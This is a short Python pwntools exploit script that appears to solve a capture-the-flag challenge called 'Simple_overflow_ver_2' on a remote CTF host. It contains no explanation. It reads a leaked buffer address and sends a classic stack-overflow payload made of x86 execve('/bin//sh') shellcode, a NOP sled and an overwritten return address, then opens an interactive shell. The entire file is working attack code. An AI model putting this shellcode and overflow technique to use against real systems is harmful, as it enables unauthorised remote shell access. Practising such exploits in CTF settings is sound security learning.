from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3006)
#p = process('./Simple_overflow_ver_2')
#gdb.attach(p)

print p.recvuntil('Data : ')
p.sendline('a')
buff_addr = p.recvline().split(' ')
buff_addr = int(buff_addr[0].replace(':',''),16)
#buff_addr = buff_addr.replace(':','')
print 'buff_addr = ', buff_addr
print 'type = ', type(buff_addr)

print p.recvuntil(':')
p.sendline('y')

print p.recvuntil('Data : ')
payload = ''
payload += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
payload += '\x90'*117
payload += p32(buff_addr)

p.sendline(payload)
print p.recvuntil(':')
p.sendline('n')

sleep(0.5)

p.interactive()
